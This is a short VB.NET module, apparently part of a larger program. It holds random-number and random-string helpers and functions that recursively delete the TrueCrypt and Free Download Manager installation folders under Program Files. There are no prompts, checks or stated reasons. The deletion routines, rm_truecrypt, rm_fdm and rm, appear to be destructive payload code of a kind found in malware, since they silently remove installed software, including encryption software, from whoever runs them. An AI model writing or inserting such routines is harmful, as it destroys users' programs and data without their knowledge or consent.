Imports System.IO

Module modLib

    Public Function rnd_number(x As Integer, y As Integer) As String
        Dim rn As New Random
        Return rn.Next(x, y)
    End Function

    Public Function RandomString(size As Integer, Optional validchars As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz") As String
        If size < 1 Or validchars.Length = 0 Then Return ""
        RandomString = ""
        Randomize()
        For i = 1 To size
            RandomString &= Mid(validchars, Int(Rnd() * validchars.Length) + 1, 1)
        Next
    End Function

    Public Function rm_truecrypt()
        Dim szProgramFilesPath As String
        szProgramFilesPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)
        rm(szProgramFilesPath & "\TrueCrypt\")
        Return Nothing
    End Function

    Public Function rm_fdm()
        Dim szProgramFilesPath As String
        szProgramFilesPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)
        rm(szProgramFilesPath & "\Free Download Manager\")
        Return Nothing
    End Function

    Public Function rm(path As String)
        Directory.Delete(path, True)
        Return Nothing
    End Function

End Module
